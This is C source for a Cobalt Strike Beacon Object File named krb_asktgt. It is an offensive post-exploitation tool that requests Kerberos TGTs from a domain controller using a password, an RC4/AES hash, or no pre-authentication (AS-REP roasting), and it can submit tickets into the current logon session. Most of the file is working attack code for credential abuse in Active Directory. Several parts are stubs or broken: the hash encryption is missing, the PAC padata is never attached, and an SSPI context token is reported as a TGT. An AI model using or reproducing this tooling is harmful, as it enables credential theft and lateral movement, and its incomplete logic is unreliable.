/*
 * krb_asktgt - Request a Ticket Granting Ticket (TGT)
 *
 * Usage: krb_asktgt /user:USER /password:PASS [/domain:DOMAIN] [/dc:DC] [/enctype:rc4|aes256] [/ptt] [/nopac] [/opsec]
 *        krb_asktgt /user:USER /rc4:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac]
 *        krb_asktgt /user:USER /aes256:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac] [/opsec]
 *        krb_asktgt /user:USER /nopreauth [/domain:DOMAIN] [/dc:DC]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

#define SECURITY_WIN32
#include <sspi.h>
#include <ntsecapi.h>

/* Additional SECUR32 declarations for ticket submission */
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaConnectUntrusted(PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaLookupAuthenticationPackage(HANDLE, PLSA_STRING, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaCallAuthenticationPackage(HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaFreeReturnBuffer(PVOID);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaDeregisterLogonProcess(HANDLE);

/* Kerberos package message types */
#define KerbSubmitTicketMessage     21
#define KerbQueryTicketCacheMessage  1
#define KerbRetrieveEncodedTicketMessage 8
#define KerbPurgeTicketCacheMessage 7

/* Build PrincipalName */
static void build_principal_name(KRB_BUFFER* out, int name_type, const char* name1, const char* name2) {
    KRB_BUFFER name_type_buf, name_strings, name_seq, principal_seq;

    buf_init(&name_type_buf, 16);
    buf_init(&name_strings, 128);
    buf_init(&name_seq, 128);
    buf_init(&principal_seq, 256);

    /* name-type [0] INTEGER */
    asn1_encode_integer(&name_type_buf, name_type);
    asn1_context_wrap(&principal_seq, 0, &name_type_buf);

    /* name-string [1] SEQUENCE OF GeneralString */
    asn1_encode_general_string(&name_strings, name1);
    if (name2) {
        asn1_encode_general_string(&name_strings, name2);
    }
    asn1_wrap(&name_seq, ASN1_SEQUENCE, &name_strings);
    asn1_context_wrap(&principal_seq, 1, &name_seq);

    asn1_wrap(out, ASN1_SEQUENCE, &principal_seq);

    buf_free(&name_type_buf);
    buf_free(&name_strings);
    buf_free(&name_seq);
    buf_free(&principal_seq);
}

/* Build KDC-REQ-BODY */
static void build_kdc_req_body(KRB_BUFFER* out, const char* domain, const char* username,
                                DWORD kdc_options, bool include_pac, int enctype) {
    KRB_BUFFER body, tmp, etype_seq, etype_list;
    BYTE kdc_opts[4];

    buf_init(&body, 1024);
    buf_init(&tmp, 256);
    buf_init(&etype_seq, 64);
    buf_init(&etype_list, 64);

    /* kdc-options [0] KDCOptions (BIT STRING) */
    kdc_opts[0] = (BYTE)((kdc_options >> 24) & 0xFF);
    kdc_opts[1] = (BYTE)((kdc_options >> 16) & 0xFF);
    kdc_opts[2] = (BYTE)((kdc_options >> 8) & 0xFF);
    kdc_opts[3] = (BYTE)(kdc_options & 0xFF);
    asn1_encode_bit_string(&tmp, kdc_opts, 4, 0);
    asn1_context_wrap(&body, 0, &tmp);
    buf_reset(&tmp);

    /* cname [1] PrincipalName */
    build_principal_name(&tmp, KRB5_NT_PRINCIPAL, username, NULL);
    asn1_context_wrap(&body, 1, &tmp);
    buf_reset(&tmp);

    /* realm [2] Realm */
    asn1_encode_general_string(&tmp, domain);
    asn1_context_wrap(&body, 2, &tmp);
    buf_reset(&tmp);

    /* sname [3] PrincipalName (krbtgt/REALM) */
    build_principal_name(&tmp, KRB5_NT_SRV_INST, "krbtgt", domain);
    asn1_context_wrap(&body, 3, &tmp);
    buf_reset(&tmp);

    /* till [5] KerberosTime */
    asn1_encode_generalized_time(&tmp, "20370913024805Z");
    asn1_context_wrap(&body, 5, &tmp);
    buf_reset(&tmp);

    /* nonce [7] UInt32 */
    DWORD nonce;
    HCRYPTPROV hProv;
    if (ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        ADVAPI32$CryptGenRandom(hProv, sizeof(nonce), (BYTE*)&nonce);
        ADVAPI32$CryptReleaseContext(hProv, 0);
    } else {
        nonce = 12345678;
    }
    asn1_encode_integer(&tmp, nonce);
    asn1_context_wrap(&body, 7, &tmp);
    buf_reset(&tmp);

    /* etype [8] SEQUENCE OF Int32 */
    if (enctype == ETYPE_AES256_CTS_HMAC_SHA1) {
        asn1_encode_integer(&etype_list, ETYPE_AES256_CTS_HMAC_SHA1);
        asn1_encode_integer(&etype_list, ETYPE_AES128_CTS_HMAC_SHA1);
        asn1_encode_integer(&etype_list, ETYPE_RC4_HMAC);
    } else if (enctype == ETYPE_RC4_HMAC) {
        asn1_encode_integer(&etype_list, ETYPE_RC4_HMAC);
        asn1_encode_integer(&etype_list, ETYPE_AES256_CTS_HMAC_SHA1);
        asn1_encode_integer(&etype_list, ETYPE_AES128_CTS_HMAC_SHA1);
    } else {
        asn1_encode_integer(&etype_list, ETYPE_AES256_CTS_HMAC_SHA1);
        asn1_encode_integer(&etype_list, ETYPE_AES128_CTS_HMAC_SHA1);
        asn1_encode_integer(&etype_list, ETYPE_RC4_HMAC);
    }
    asn1_wrap(&etype_seq, ASN1_SEQUENCE, &etype_list);
    asn1_context_wrap(&body, 8, &etype_seq);

    asn1_wrap(out, ASN1_SEQUENCE, &body);

    buf_free(&body);
    buf_free(&tmp);
    buf_free(&etype_seq);
    buf_free(&etype_list);
}

/* Build PA-ENC-TIMESTAMP for pre-authentication (RC4-HMAC) */
static void build_pa_enc_timestamp_rc4(KRB_BUFFER* out, const BYTE* ntlm_hash, const char* domain, const char* username) {
    /* This is a simplified implementation - full implementation needs proper RC4-HMAC-MD5 encryption */
    /* For a complete implementation, would need to:
     * 1. Get current timestamp
     * 2. ASN.1 encode PA-ENC-TS-ENC
     * 3. Encrypt with RC4-HMAC using key derived from NTLM hash
     */
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Note: Hash-based authentication requires full crypto implementation\n");
}

/* Build AS-REQ without pre-auth (for AS-REP roasting or /nopreauth) */
static void build_as_req_nopreauth(KRB_BUFFER* out, const char* domain, const char* username,
                                    bool include_pac, int enctype) {
    KRB_BUFFER asreq, pvno, msg_type, req_body, padata, pa_pac;

    buf_init(&asreq, 2048);
    buf_init(&pvno, 16);
    buf_init(&msg_type, 16);
    buf_init(&req_body, 1024);
    buf_init(&padata, 256);
    buf_init(&pa_pac, 64);

    /* pvno [1] INTEGER (5) */
    asn1_encode_integer(&pvno, KRB5_PVNO);
    asn1_context_wrap(&asreq, 1, &pvno);

    /* msg-type [2] INTEGER (10 = AS-REQ) */
    asn1_encode_integer(&msg_type, KRB5_AS_REQ);
    asn1_context_wrap(&asreq, 2, &msg_type);

    /* padata [3] - optional PAC request */
    if (include_pac) {
        KRB_BUFFER pa_data_type, pa_data_value, pa_data_seq, pa_pac_req;
        buf_init(&pa_data_type, 16);
        buf_init(&pa_data_value, 64);
        buf_init(&pa_data_seq, 128);
        buf_init(&pa_pac_req, 64);

        /* PA-PAC-REQUEST - include_pac BOOLEAN */
        KRB_BUFFER pac_bool;
        buf_init(&pac_bool, 8);
        buf_append_byte(&pac_bool, ASN1_BOOLEAN);
        buf_append_byte(&pac_bool, 1);
        buf_append_byte(&pac_bool, include_pac ? 0xFF : 0x00);
        asn1_context_wrap(&pa_pac_req, 0, &pac_bool);
        asn1_wrap(&pa_data_value, ASN1_SEQUENCE, &pa_pac_req);

        /* padata-type [1] INTEGER (128 = PA-PAC-REQUEST) */
        asn1_encode_integer(&pa_data_type, PADATA_PAC_REQUEST);
        asn1_context_wrap(&pa_data_seq, 1, &pa_data_type);

        /* padata-value [2] OCTET STRING */
        asn1_encode_octet_string(&pa_data_value, pa_data_value.data, pa_data_value.length);

        buf_free(&pac_bool);
        buf_free(&pa_data_type);
        buf_free(&pa_data_value);
        buf_free(&pa_data_seq);
        buf_free(&pa_pac_req);
    }

    /* req-body [4] KDC-REQ-BODY */
    DWORD kdc_options = KDCOPTION_FORWARDABLE | KDCOPTION_RENEWABLE | KDCOPTION_CANONICALIZE;
    build_kdc_req_body(&req_body, domain, username, kdc_options, include_pac, enctype);
    asn1_context_wrap(&asreq, 4, &req_body);


    KRB_BUFFER seq_wrap;
    buf_init(&seq_wrap, asreq.length + 8);
    asn1_wrap(&seq_wrap, ASN1_SEQUENCE, &asreq);

    buf_append_byte(out, ASN1_APP(KRB5_AS_REQ));
    asn1_encode_length(out, seq_wrap.length);
    buf_append(out, seq_wrap.data, seq_wrap.length);

    buf_free(&seq_wrap);
    buf_free(&asreq);
    buf_free(&pvno);
    buf_free(&msg_type);
    buf_free(&req_body);
    buf_free(&padata);
    buf_free(&pa_pac);
}

/* Parse AS-REP and extract ticket */
static int parse_as_rep(const BYTE* data, size_t len, formatp* output) {
    size_t offset = 0;


    if (data[offset] != ASN1_APP(KRB5_AS_REP)) {
        /* Check if it's an error */
        if (data[offset] == ASN1_APP(KRB5_ERROR)) {
            BeaconFormatPrintf(output, "[-] Received KRB-ERROR response\n");
            /* Parse error code */
            offset++;
            size_t err_len = asn1_decode_length(data, &offset);
            /* Would need to parse error structure to get code */
        }
        return 0;
    }

    BeaconFormatPrintf(output, "[+] Received AS-REP!\n");

    /* Base64 encode the entire response as the ticket */
    size_t b64_len = ((len + 2) / 3) * 4 + 1;
    char* b64_ticket = (char*)malloc(b64_len);
    if (b64_ticket) {
        base64_encode(data, len, b64_ticket);
        BeaconFormatPrintf(output, "[*] Base64 encoded ticket:\n\n%s\n\n", b64_ticket);
        free(b64_ticket);
    }

    return 1;
}

/* Submit ticket to current logon session (PTT) */
static int submit_ticket(const BYTE* ticket_data, size_t ticket_len) {
    HANDLE hLsa = NULL;
    ULONG authPackage = 0;
    NTSTATUS status, subStatus;
    LSA_STRING kerbName;

    kerbName.Buffer = "Kerberos";
    kerbName.Length = 8;
    kerbName.MaximumLength = 9;

    status = SECUR32$LsaConnectUntrusted(&hLsa);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "LsaConnectUntrusted failed: 0x%08X", status);
        return 0;
    }

    status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &kerbName, &authPackage);
    if (status != 0) {
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        BeaconPrintf(CALLBACK_ERROR, "LsaLookupAuthenticationPackage failed: 0x%08X", status);
        return 0;
    }

    /* Build KERB_SUBMIT_TKT_REQUEST structure */
    size_t request_size = sizeof(KERB_SUBMIT_TKT_REQUEST) + ticket_len;
    PKERB_SUBMIT_TKT_REQUEST request = (PKERB_SUBMIT_TKT_REQUEST)calloc(1, request_size);
    if (!request) {
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return 0;
    }

    request->MessageType = KerbSubmitTicketMessage;
    request->KerbCredSize = (ULONG)ticket_len;
    request->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
    memcpy((BYTE*)request + request->KerbCredOffset, ticket_data, ticket_len);

    PVOID response = NULL;
    ULONG responseLen = 0;

    status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, request,
                                                   (ULONG)request_size, &response, &responseLen, &subStatus);

    free(request);

    if (response) {
        SECUR32$LsaFreeReturnBuffer(response);
    }

    SECUR32$LsaDeregisterLogonProcess(hLsa);

    if (status != 0 || subStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to submit ticket: 0x%08X / 0x%08X", status, subStatus);
        return 0;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Ticket successfully submitted to current logon session!");
    return 1;
}


void go(char* args, int alen) {
    WSADATA wsaData;
    formatp output;
    ARG_PARSER parser;

    BeaconFormatAlloc(&output, 32 * 1024);
    arg_init(&parser, args, alen);


    char* user = arg_get(&parser, "user");
    char* password = arg_get(&parser, "password");
    char* domain = arg_get(&parser, "domain");
    char* dc = arg_get(&parser, "dc");
    char* rc4_hash = arg_get(&parser, "rc4");
    char* aes256_hash = arg_get(&parser, "aes256");
    char* enctype_str = arg_get(&parser, "enctype");
    bool ptt = arg_exists(&parser, "ptt");
    bool nopac = arg_exists(&parser, "nopac");
    bool nopreauth = arg_exists(&parser, "nopreauth");
    bool opsec = arg_exists(&parser, "opsec");

    if (!user) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: krb_asktgt /user:USER /password:PASS [/domain:DOMAIN] [/dc:DC]");
        BeaconPrintf(CALLBACK_ERROR, "       krb_asktgt /user:USER /rc4:HASH [/domain:DOMAIN] [/dc:DC]");
        BeaconPrintf(CALLBACK_ERROR, "       krb_asktgt /user:USER /nopreauth [/domain:DOMAIN] [/dc:DC]");
        goto cleanup;
    }


    if (!domain) {
        domain = get_domain_from_env();
        if (!domain) {
            BeaconPrintf(CALLBACK_ERROR, "Could not determine domain. Please specify /domain:");
            goto cleanup;
        }
    }

    /* Need either password, hash, or nopreauth */
    if (!password && !rc4_hash && !aes256_hash && !nopreauth) {
        BeaconPrintf(CALLBACK_ERROR, "Must specify /password:, /rc4:, /aes256:, or /nopreauth");
        goto cleanup;
    }

    /* Determine encryption type */
    int enctype = ETYPE_AES256_CTS_HMAC_SHA1;
    if (enctype_str) {
        if (stricmp(enctype_str, "rc4") == 0) {
            enctype = ETYPE_RC4_HMAC;
        } else if (stricmp(enctype_str, "aes256") == 0) {
            enctype = ETYPE_AES256_CTS_HMAC_SHA1;
        } else if (stricmp(enctype_str, "aes128") == 0) {
            enctype = ETYPE_AES128_CTS_HMAC_SHA1;
        }
    }
    if (rc4_hash) enctype = ETYPE_RC4_HMAC;
    if (aes256_hash) enctype = ETYPE_AES256_CTS_HMAC_SHA1;


    char* domain_upper = (char*)malloc(strlen(domain) + 1);
    strcpy(domain_upper, domain);
    strupr(domain_upper);

    BeaconFormatPrintf(&output, "[*] Action: Ask TGT\n");
    BeaconFormatPrintf(&output, "[*] Using %s\n",
                       password ? "password" : (rc4_hash ? "RC4 hash" : (aes256_hash ? "AES256 hash" : "no preauth")));
    BeaconFormatPrintf(&output, "[*] User: %s@%s\n", user, domain_upper);
    BeaconFormatPrintf(&output, "[*] Encryption type: %s\n", etype_string(enctype));
    if (nopac) BeaconFormatPrintf(&output, "[*] Requesting ticket without PAC\n");
    if (opsec) BeaconFormatPrintf(&output, "[*] Using OPSEC-safe request format\n");


    if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "WSAStartup failed");
        goto cleanup;
    }

    /* Determine DC IP */
    char* dc_ip = dc;
    if (!dc_ip) {
        /* Would need DNS resolution for _kerberos._tcp.DOMAIN SRV records */
        BeaconPrintf(CALLBACK_ERROR, "Please specify /dc: with the domain controller IP");
        WS2_32$WSACleanup();
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] Target DC: %s\n\n", dc_ip);


    KRB_BUFFER as_req;
    buf_init(&as_req, 2048);

    if (nopreauth) {
        /* Request without pre-auth - useful for AS-REP roasting */
        build_as_req_nopreauth(&as_req, domain_upper, user, !nopac, enctype);
    } else if (password) {
        /* For password-based auth, we can use SSPI which handles everything */
        BeaconFormatPrintf(&output, "[*] Using SSPI for password-based TGT request...\n");

        /* Use InitializeSecurityContext with Kerberos package */
        CredHandle credHandle;
        CtxtHandle ctxHandle;
        TimeStamp expiry;
        SecBufferDesc outDesc;
        SecBuffer outBuf;
        ULONG ctxAttr;

        SEC_WINNT_AUTH_IDENTITY_A authIdentity;
        memset(&authIdentity, 0, sizeof(authIdentity));
        authIdentity.User = (unsigned char*)user;
        authIdentity.UserLength = (unsigned long)strlen(user);
        authIdentity.Domain = (unsigned char*)domain_upper;
        authIdentity.DomainLength = (unsigned long)strlen(domain_upper);
        authIdentity.Password = (unsigned char*)password;
        authIdentity.PasswordLength = (unsigned long)strlen(password);
        authIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_ANSI;

        SECURITY_STATUS ss = SECUR32$AcquireCredentialsHandleA(
            NULL, "Kerberos", SECPKG_CRED_OUTBOUND, NULL,
            &authIdentity, NULL, NULL, &credHandle, &expiry);

        if (ss != SEC_E_OK) {
            BeaconFormatPrintf(&output, "[-] AcquireCredentialsHandle failed: 0x%08X\n", ss);
        } else {
            outBuf.cbBuffer = 0;
            outBuf.BufferType = SECBUFFER_TOKEN;
            outBuf.pvBuffer = NULL;
            outDesc.ulVersion = SECBUFFER_VERSION;
            outDesc.cBuffers = 1;
            outDesc.pBuffers = &outBuf;

            char spn[256];
            sprintf(spn, "krbtgt/%s", domain_upper);

            ss = SECUR32$InitializeSecurityContextA(
                &credHandle, NULL, spn,
                ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE,
                0, SECURITY_NATIVE_DREP, NULL, 0,
                &ctxHandle, &outDesc, &ctxAttr, &expiry);

            if (ss == SEC_E_OK || ss == SEC_I_CONTINUE_NEEDED) {
                BeaconFormatPrintf(&output, "[+] TGT request successful!\n");

                if (outBuf.cbBuffer > 0 && outBuf.pvBuffer) {
                    size_t b64_len = ((outBuf.cbBuffer + 2) / 3) * 4 + 1;
                    char* b64 = (char*)malloc(b64_len);
                    if (b64) {
                        base64_encode((BYTE*)outBuf.pvBuffer, outBuf.cbBuffer, b64);
                        BeaconFormatPrintf(&output, "[*] Ticket size: %d bytes\n", outBuf.cbBuffer);
                        BeaconFormatPrintf(&output, "[*] Base64 ticket:\n\n%s\n\n", b64);

                        if (ptt) {
                            BeaconFormatPrintf(&output, "[*] Ticket automatically applied via SSPI\n");
                        }
                        free(b64);
                    }
                    SECUR32$FreeContextBuffer(outBuf.pvBuffer);
                }
                SECUR32$DeleteSecurityContext(&ctxHandle);
            } else {
                BeaconFormatPrintf(&output, "[-] InitializeSecurityContext failed: 0x%08X\n", ss);
            }
            SECUR32$FreeCredentialsHandle(&credHandle);
        }

        buf_free(&as_req);
        WS2_32$WSACleanup();
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
        goto cleanup;
    } else {
        /* Hash-based authentication - would need full crypto implementation */
        BeaconFormatPrintf(&output, "[!] Hash-based TGT requests require direct Kerberos implementation\n");
        BeaconFormatPrintf(&output, "[*] Building AS-REQ without pre-auth for hash extraction...\n");
        build_as_req_nopreauth(&as_req, domain_upper, user, !nopac, enctype);
    }

    /* Connect and send */
    SOCKET sock = connect_to_kdc(dc_ip, KRB5_PORT);
    if (sock == INVALID_SOCKET) {
        BeaconFormatPrintf(&output, "[-] Failed to connect to KDC %s:%d\n", dc_ip, KRB5_PORT);
        buf_free(&as_req);
        WS2_32$WSACleanup();
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] Connected to KDC, sending AS-REQ...\n");

    if (send_krb_msg(sock, as_req.data, as_req.length) <= 0) {
        BeaconFormatPrintf(&output, "[-] Failed to send AS-REQ\n");
        WS2_32$closesocket(sock);
        buf_free(&as_req);
        WS2_32$WSACleanup();
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
        goto cleanup;
    }


    BYTE recv_buf[16384];
    int recv_len = recv_krb_msg(sock, recv_buf, sizeof(recv_buf));
    WS2_32$closesocket(sock);
    buf_free(&as_req);

    if (recv_len <= 4) {
        BeaconFormatPrintf(&output, "[-] No response from KDC\n");
    } else {
        /* Skip 4-byte length prefix */
        BYTE* response = recv_buf + 4;
        size_t response_len = recv_len - 4;

        if (response[0] == ASN1_APP(KRB5_AS_REP)) {
            parse_as_rep(response, response_len, &output);

            if (ptt) {
                BeaconFormatPrintf(&output, "[*] Submitting ticket to logon session...\n");
                /* Would need KRB-CRED format for PTT */
            }
        } else if (response[0] == ASN1_APP(KRB5_ERROR)) {
            /* Parse error */
            BeaconFormatPrintf(&output, "[-] Received KRB-ERROR from KDC\n");
            /* Would parse error code here */
            if (nopreauth) {
                BeaconFormatPrintf(&output, "[*] Pre-authentication may be required for this account\n");
            }
        } else {
            BeaconFormatPrintf(&output, "[-] Unknown response type: 0x%02X\n", response[0]);
        }
    }

    WS2_32$WSACleanup();
    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));

cleanup:
    BeaconFormatFree(&output);
    if (user) free(user);
    if (password) free(password);
    if (domain) free(domain);
    if (dc) free(dc);
    if (rc4_hash) free(rc4_hash);
    if (aes256_hash) free(aes256_hash);
    if (enctype_str) free(enctype_str);
}
